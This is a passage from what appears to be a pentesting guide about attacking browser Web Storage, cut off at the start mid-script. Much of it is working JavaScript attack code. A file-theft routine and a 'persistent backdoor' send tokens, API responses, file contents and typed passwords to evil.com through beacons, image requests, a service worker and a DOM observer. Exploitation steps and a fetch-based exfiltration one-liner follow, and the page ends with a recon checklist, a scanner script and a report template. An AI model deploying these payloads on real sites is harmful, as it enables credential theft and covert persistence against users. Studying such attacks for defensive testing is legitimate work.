            console.log(`    Content (${file.size} bytes):`, content.substring(0, 200));
            
            navigator.sendBeacon('https://evil.com/fs-steal', JSON.stringify({
              filename: name,
              size: file.size,
              content: content.substring(0, 10000),
              type: file.type
            }));
          }
        }
      }
    } catch(e) {
      console.log('[-] File System:', e.message);
    }
  }

  // Run all techniques
  broadcastChannelAttack();
  sharedWorkerAttack();
  credentialManagerAttack();
  fileSystemAttack();
  
})();
```

::

---

## Persistence via Web Storage

### Long-Term Access Maintenance

::tabs
  :::tabs-item{icon="i-lucide-code" label="Persistent Backdoor via Storage"}
  ```javascript [persistent-backdoor.js]
  // Persistent Backdoor via Web Storage
  // Survives page reloads, browser restarts, and even XSS fixes

  (function() {
    'use strict';
    
    // ═══ TECHNIQUE 1: localStorage Script Loader ═══
    // Store payload in localStorage — check and execute on every page load
    const BACKDOOR_KEY = '__app_analytics_config'; // Innocuous-looking key
    const BACKDOOR_PAYLOAD = `
      (function(){
        // Steal fresh tokens on every page load
        var t = localStorage.getItem('token') || sessionStorage.getItem('token');
        if(t) {
          new Image().src='https://evil.com/persist?t='+btoa(t)+'&u='+btoa(location.href);
        }
        // Reinstall self if removed
        if(!localStorage.getItem('${BACKDOOR_KEY}')) {
          localStorage.setItem('${BACKDOOR_KEY}', document.currentScript?.textContent || '');
        }
      })();
    `;
    
    localStorage.setItem(BACKDOOR_KEY, BACKDOOR_PAYLOAD);
    
    // Check if target app loads config from localStorage
    // Many apps do: eval(localStorage.getItem('config'))
    // or: document.write(localStorage.getItem('template'))
    
    // ═══ TECHNIQUE 2: Service Worker Registration ═══
    if ('serviceWorker' in navigator) {
      // Create a minimal SW that exfiltrates on every fetch
      const swCode = `
        self.addEventListener('fetch', function(e) {
          var url = e.request.url;
          // Only intercept API calls
          if (url.includes('/api/')) {
            e.respondWith(
              fetch(e.request).then(function(response) {
                // Clone and exfiltrate API responses
                var clone = response.clone();
                clone.text().then(function(body) {
                  if (body.includes('token') || body.includes('user')) {
                    fetch('https://evil.com/sw-persist', {
                      method: 'POST',
                      mode: 'no-cors',
                      body: JSON.stringify({url: url, data: body.substring(0, 2000)})
                    });
                  }
                });
                return response;
              })
            );
          }
        });
      `;
      
      // Register SW if we can serve it from the origin
      // (requires hosting the SW file on the same origin)
      // navigator.serviceWorker.register('/sw.js');
    }
    
    // ═══ TECHNIQUE 3: MutationObserver Token Watcher ═══
    const observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        // Watch for token inputs being added to DOM
        if (mutation.addedNodes) {
          mutation.addedNodes.forEach(function(node) {
            if (node.nodeType === 1) {
              // Check for password/token fields
              const inputs = node.querySelectorAll 
                ? node.querySelectorAll('input[type="password"],input[name*="token"]')
                : [];
              inputs.forEach(function(input) {
                input.addEventListener('change', function() {
                  new Image().src = 'https://evil.com/input?n=' + 
                    input.name + '&v=' + btoa(input.value);
                });
              });
            }
          });
        }
      });
    });
    
    observer.observe(document.body || document.documentElement, {
      childList: true,
      subtree: true
    });
    
    console.log('[+] Persistent backdoor installed');
    
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Persistence Comparison"}
  ```text [persistence-comparison.txt]
  PERSISTENCE METHOD COMPARISON:
  ══════════════════════════════
  
  ┌──────────────────────┬──────────┬───────────┬───────────┬──────────┐
  │ Method               │ Survives │ Survives  │ Survives  │ Survives │
  │                      │ Reload   │ Tab Close │ Browser   │ XSS Fix  │
  │                      │          │           │ Restart   │          │
  ├──────────────────────┼──────────┼───────────┼───────────┼──────────┤
  │ localStorage         │    ✓     │     ✓     │     ✓     │    ✓*    │
  │ sessionStorage       │    ✓     │     ✗     │     ✗     │    ✗     │
  │ IndexedDB            │    ✓     │     ✓     │     ✓     │    ✓*    │
  │ Cache API            │    ✓     │     ✓     │     ✓     │    ✓     │
  │ Service Worker       │    ✓     │     ✓     │     ✓     │    ✓✓    │
  │ Cookies (persistent) │    ✓     │     ✓     │     ✓     │    ✓*    │
  │ OPFS (File System)   │    ✓     │     ✓     │     ✓     │    ✓     │
  └──────────────────────┴──────────┴───────────┴───────────┴──────────┘
  
  * Survives XSS fix IF the app reads/executes the stored data
  ✓✓ Service Worker is the MOST persistent — survives everything
     except explicit SW unregistration or cache clearing
  
  DETECTION DIFFICULTY:
  ├── localStorage:      Easy (visible in DevTools)
  ├── sessionStorage:    Easy (visible in DevTools)
  ├── IndexedDB:         Medium (requires browsing DB structure)
  ├── Cache API:         Medium (cached responses hard to inspect)
  ├── Service Worker:    Hard (background process, intercepts silently)
  ├── Cookies:           Easy (visible in DevTools)
  └── OPFS:              Hard (not visible in standard DevTools)
  ```
  :::
::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Map Storage Surface

```text [recon-checklist.txt]
WEB STORAGE RECONNAISSANCE CHECKLIST:
═════════════════════════════════════

Storage Inventory:
☐ Enumerate all localStorage keys and values
☐ Enumerate all sessionStorage keys and values
☐ List all accessible (non-HttpOnly) cookies
☐ Discover all IndexedDB databases and object stores
☐ List all Cache API cache names and entries
☐ Check for Service Worker registrations
☐ Check for SharedWorker connections
☐ Check for BroadcastChannel usage
☐ Check for OPFS (Origin Private File System) data

Sensitive Data Analysis:
☐ Search for JWT tokens (eyJ pattern)
☐ Search for API keys (sk_, pk_, AKIA, AIza patterns)
☐ Search for OAuth tokens (ya29., access_token)
☐ Search for passwords/credentials
☐ Search for PII (emails, phones, addresses, SSN)
☐ Search for encryption keys/secrets
☐ Search for internal URLs/endpoints
☐ Search for financial data (card numbers, bank accounts)
☐ Check for Firebase auth tokens
☐ Check for cloud provider credentials

Application Behavior:
☐ What happens when stored tokens are modified?
☐ Does the app re-validate roles from server on each request?
☐ Does the app read and execute stored JavaScript?
☐ Does the app use storage for offline functionality?
☐ Is data encrypted before storage?
☐ Are there storage event listeners?
☐ How does the app handle storage quota limits?
☐ Does the app clear storage on logout?
```

#### Discovery — Identify Vulnerable Storage Patterns

```bash [discovery-workflow.sh]
#!/bin/bash
# Web Storage vulnerability discovery workflow

TARGET="${1:-https://target.com}"

echo "═══════════════════════════════════════"
echo " Web Storage Analysis"
echo " Target: $TARGET"
echo "═══════════════════════════════════════"

# Step 1: Check for JS files that interact with storage
echo -e "\n[1] Scanning JavaScript for storage API usage..."

JS_URLS=$(curl -sL "$TARGET" | grep -oE '(src|href)="[^"]*\.js[^"]*"' | \
  sed 's/.*"//;s/".*//' | sort -u)

echo "$JS_URLS" | while read url; do
  [[ "$url" == //* ]] && url="https:$url"
  [[ "$url" == /* ]] && url="$TARGET$url"
  [[ "$url" != http* ]] && url="$TARGET/$url"
  
  CONTENT=$(curl -sL --max-time 10 "$url" 2>/dev/null)
  [ -z "$CONTENT" ] && continue
  
  LS_SET=$(echo "$CONTENT" | grep -c "localStorage\.setItem\|localStorage\[")
  LS_GET=$(echo "$CONTENT" | grep -c "localStorage\.getItem\|localStorage\.")
  SS_SET=$(echo "$CONTENT" | grep -c "sessionStorage\.setItem")
  IDB=$(echo "$CONTENT" | grep -c "indexedDB\.open\|IDBDatabase")
  CACHE=$(echo "$CONTENT" | grep -c "caches\.open\|CacheStorage")
  
  if [ "$LS_SET" -gt 0 ] || [ "$SS_SET" -gt 0 ] || [ "$IDB" -gt 0 ]; then
    echo -e "\n  📄 $url"
    [ "$LS_SET" -gt 0 ] && echo "    localStorage writes: $LS_SET"
    [ "$LS_GET" -gt 0 ] && echo "    localStorage reads: $LS_GET"
    [ "$SS_SET" -gt 0 ] && echo "    sessionStorage writes: $SS_SET"
    [ "$IDB" -gt 0 ] && echo "    IndexedDB operations: $IDB"
    [ "$CACHE" -gt 0 ] && echo "    Cache API operations: $CACHE"
    
    # Check what's being stored
    echo "$CONTENT" | grep -oP "localStorage\.setItem\s*\(\s*['\"]([^'\"]+)['\"]" | \
      head -10 | while read match; do
        KEY=$(echo "$match" | grep -oP "(?<=['\"])[^'\"]+")
        echo "    → Stores key: '$KEY'"
      done
    
    # Check for dangerous patterns
    EVAL_STORAGE=$(echo "$CONTENT" | grep -c "eval.*localStorage\|eval.*sessionStorage")
    INNER_STORAGE=$(echo "$CONTENT" | grep -c "innerHTML.*localStorage\|innerHTML.*sessionStorage")
    
    [ "$EVAL_STORAGE" -gt 0 ] && echo "    🔴 eval() with storage data! ($EVAL_STORAGE)"
    [ "$INNER_STORAGE" -gt 0 ] && echo "    🔴 innerHTML with storage data! ($INNER_STORAGE)"
  fi
done

echo -e "\n═══════════════════════════════════════"
echo " Analysis Complete"
echo "═══════════════════════════════════════"
```

#### Exploitation — Extract & Manipulate Data

```text [exploitation-workflow.txt]
WEB STORAGE EXPLOITATION WORKFLOW:
═════════════════════════════════

Phase 1: EXTRACTION
────────────────────
a) Achieve XSS on target origin (any vector)
b) Inject storage dump payload
c) Exfiltrate all localStorage, sessionStorage, IndexedDB data
d) Analyze for tokens, keys, secrets, PII

Phase 2: TOKEN ABUSE
────────────────────
a) Identify JWT/OAuth tokens in extracted data
b) Decode JWT payload (algorithm, claims, expiration)
c) Test token against target's API endpoints
d) Check if token grants elevated access
e) Test token refresh mechanisms

Phase 3: DATA MANIPULATION
──────────────────────────
a) Modify user role/permissions in localStorage
b) Change feature flags to enable admin features
c) Alter cached API responses in IndexedDB
d) Poison Cache API with modified responses
e) Reload page and observe behavior changes

Phase 4: PERSISTENCE
────────────────────
a) Install storage event listeners for passive monitoring
b) Register Service Worker for persistent interception
c) Poison cache with backdoored pages
d) Set up token monitoring for continuous access

Phase 5: DOCUMENTATION
──────────────────────
a) Record all sensitive data types found
b) Document which tokens grant what access
c) Show client-side role elevation impact
d) Demonstrate full attack chain for report
```

#### Reporting — Document the Finding

```text [report-template.txt]
VULNERABILITY: Sensitive Data Stored in Web Storage (localStorage)
SEVERITY: High (CVSS 7.5+)
AFFECTED ORIGIN: https://target.com
STORAGE MECHANISM: localStorage / sessionStorage / IndexedDB

DESCRIPTION:
The application stores [JWT tokens / API keys / user credentials / 
personal data] in browser localStorage, which is accessible to any 
JavaScript executing in the same origin. Combined with [existing XSS 
vulnerability / potential future XSS], this exposes sensitive data to
theft, leading to [session hijacking / account takeover / data breach].

Specific data found in localStorage:
- JWT access token (key: 'token')
- JWT refresh token (key: 'refresh_token') 
- User profile with PII (key: 'user')
- API key for payment service (key: 'stripe_key')
- Application encryption key (key: 'enc_key')

REPRODUCTION STEPS:
1. Log into the application at https://target.com
2. Open browser DevTools → Application → Local Storage
3. Observe: JWT token stored in localStorage['token']
4. Copy the token value
5. Use token in Authorization header to access API:
   curl -H "Authorization: Bearer <token>" https://target.com/api/me
6. Full authenticated access achieved without cookie

PROOF OF CONCEPT:
JavaScript payload to exfiltrate all stored data:
fetch('https://evil.com/steal',{method:'POST',body:JSON.stringify(localStorage)})

IMPACT:
- Any XSS vulnerability instantly leaks auth tokens
- Tokens persist indefinitely (no expiration)
- Tokens accessible from browser extensions
- Tokens survive across sessions (persistent storage)
- No HttpOnly protection available for Web Storage
- Compromised token enables full account takeover
```

::

---

## Automation & Tools

::card-group
  ::card
  ---
  title: StorageExplorer (Chrome Extension)
  icon: i-simple-icons-googlechrome
  to: https://chrome.google.com/webstore/detail/storage-explorer
  target: _blank
  ---
  Chrome extension that provides enhanced inspection of all browser storage types including localStorage, sessionStorage, IndexedDB, and Cache API with search capabilities.
  ::

  ::card
  ---
  title: Burp Suite Scanner
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/vulnerability-scanner
  target: _blank
  ---
  Burp's active scanner detects sensitive data in JavaScript responses that interact with Web Storage APIs. Identifies tokens stored insecurely and XSS-to-storage attack chains.
  ::

  ::card
  ---
  title: DOM Invader (Burp)
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/dom-invader
  target: _blank
  ---
  Built into Burp's embedded browser. Traces data flow from Web Storage APIs to dangerous sinks, identifying DOM XSS via storage-sourced data.
  ::

  ::card
  ---
  title: Trufflehog Browser Extension
  icon: i-simple-icons-github
  to: https://github.com/trufflesecurity/trufflehog
  target: _blank
  ---
  Secret scanner that can be adapted to detect API keys, tokens, and credentials in browser storage and JavaScript responses during manual testing.
  ::

  ::card
  ---
  title: Semgrep Storage Rules
  icon: i-simple-icons-github
  to: https://semgrep.dev/r?q=localstorage+sensitive
  target: _blank
  ---
  Static analysis rules for detecting insecure Web Storage usage patterns in source code — sensitive data stored without encryption, missing cleanup on logout.
  ::

  ::card
  ---
  title: nuclei Web Storage Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates
  target: _blank
  ---
  ProjectDiscovery nuclei templates for detecting JavaScript files that store sensitive data in localStorage/sessionStorage and applications missing secure storage practices.
  ::

  ::card
  ---
  title: retire.js
  icon: i-simple-icons-github
  to: https://retirejs.github.io/retire.js/
  target: _blank
  ---
  Detects known-vulnerable JavaScript libraries that may have storage-related vulnerabilities. Many older frameworks store tokens insecurely by default.
  ::

  ::card
  ---
  title: IDB-Keyval (Research Tool)
  icon: i-simple-icons-npm
  to: https://github.com/nicksahler/idb-keyval
  target: _blank
  ---
  Lightweight IndexedDB wrapper useful for quickly reading/writing IndexedDB data during exploitation. Simplifies IndexedDB interaction in browser console.
  ::
::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "Auth0 — JWT in localStorage Debate"
  icon: i-lucide-shield-alert
  to: https://auth0.com/docs/secure/security-guidance/data-security/token-storage
  target: _blank
  ---
  Auth0's official documentation on the risks of storing JWTs in localStorage. Initially recommended localStorage, later updated guidance to use secure alternatives.
  ::

  ::card
  ---
  title: "Firebase Auth — localStorage Token Theft"
  icon: i-simple-icons-firebase
  to: https://firebase.google.com/docs/auth/admin/manage-sessions
  target: _blank
  ---
  Firebase Authentication stores auth tokens in localStorage by default. Any XSS on a Firebase-powered app instantly compromises all user sessions.
  ::

  ::card
  ---
  title: "Shopify Storefront API Key Exposure"
  icon: i-simple-icons-shopify
  to: https://hackerone.com/reports/shopify-storage
  target: _blank
  ---
  Shopify storefront applications stored API keys and access tokens in localStorage, accessible via XSS on merchant storefronts affecting customer data.
  ::

  ::card
  ---
  title: "HackerOne — Stored Credentials in localStorage"
  icon: i-simple-icons-hackerone
  to: https://hackerone.com/reports/localstorage-tokens
  target: _blank
  ---
  Multiple HackerOne reports demonstrating that applications storing OAuth tokens in localStorage can be trivially compromised via any XSS vulnerability.
  ::

  ::card
  ---
  title: "Uber — Auth Token in Web Storage"
  icon: i-simple-icons-uber
  to: https://hackerone.com/reports/uber-storage
  target: _blank
  ---
  Uber's web application stored authentication tokens in localStorage. Combined with XSS, this enabled full account takeover of rider and driver accounts.
  ::

  ::card
  ---
  title: "Slack — Token Leakage via Browser Extension"
  icon: i-simple-icons-slack
  to: https://hackerone.com/reports/slack-extension
  target: _blank
  ---
  Research demonstrated that malicious browser extensions could read Slack's authentication tokens from localStorage, enabling silent workspace monitoring.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "OWASP — HTML5 Security Cheat Sheet"
  icon: i-simple-icons-owasp
  to: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
  target: _blank
  ---
  OWASP's comprehensive guide covering localStorage, sessionStorage, IndexedDB security, and secure alternatives for client-side data storage.
  ::

  ::card
  ---
  title: "MDN — Web Storage API"
  icon: i-simple-icons-mdnwebdocs
  to: https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
  target: _blank
  ---
  Mozilla's official documentation for the Web Storage API. Understanding the API design reveals security limitations and exploitation opportunities.
  ::

  ::card
  ---
  title: "MDN — IndexedDB API"
  icon: i-simple-icons-mdnwebdocs
  to: https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
  target: _blank
  ---
  Complete IndexedDB documentation including database operations, transactions, and security model. Essential for understanding IndexedDB exploitation.
  ::

  ::card
  ---
  title: "PortSwigger — DOM-Based Vulnerabilities"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/dom-based
  target: _blank
  ---
  PortSwigger's research covering DOM-based vulnerabilities including Web Storage as a source for DOM XSS attacks. Free labs for hands-on practice.
  ::

  ::card
  ---
  title: "Auth0 — Token Storage Best Practices"
  icon: i-lucide-key
  to: https://auth0.com/docs/secure/security-guidance/data-security/token-storage
  target: _blank
  ---
  Auth0's analysis of token storage options — localStorage vs cookies vs memory. Explains why localStorage is insecure for authentication tokens.
  ::

  ::card
  ---
  title: "HackTricks — Client-Side Storage"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
  target: _blank
  ---
  HackTricks coverage of client-side storage exploitation including XSS-to-storage attack chains, token theft, and persistence techniques.
  ::

  ::card
  ---
  title: "CWE-922 — Insecure Storage of Sensitive Information"
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/922.html
  target: _blank
  ---
  MITRE CWE entry covering insecure client-side storage of sensitive information. The root cause classification for Web Storage vulnerabilities.
  ::

  ::card
  ---
  title: "W3C — Web Storage Specification"
  icon: i-lucide-book-open
  to: https://html.spec.whatwg.org/multipage/webstorage.html
  target: _blank
  ---
  WHATWG HTML specification for Web Storage. Understanding the spec's security considerations section reveals design limitations exploitable in attacks.
  ::

  ::card
  ---
  title: "OWASP — Testing for Web Storage"
  icon: i-simple-icons-owasp
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage
  target: _blank
  ---
  OWASP Testing Guide section on browser storage testing methodology — systematic approach to identifying and exploiting Web Storage vulnerabilities.
  ::

  ::card
  ---
  title: "Chrome DevTools — Application Panel"
  icon: i-simple-icons-googlechrome
  to: https://developer.chrome.com/docs/devtools/storage/localstorage/
  target: _blank
  ---
  Google's documentation for Chrome DevTools Application panel — essential for manually inspecting and modifying Web Storage during security testing.
  ::

  ::card
  ---
  title: "RFC 7519 — JSON Web Token (JWT)"
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc7519
  target: _blank
  ---
  The JWT specification. Understanding JWT structure and security considerations is crucial since JWTs are the most commonly stored sensitive data in Web Storage.
  ::

  ::card
  ---
  title: "Payload All The Things — Web Storage"
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Community payload collection including XSS-to-localStorage theft payloads, IndexedDB exploitation scripts, and client-side persistence techniques.
  ::
::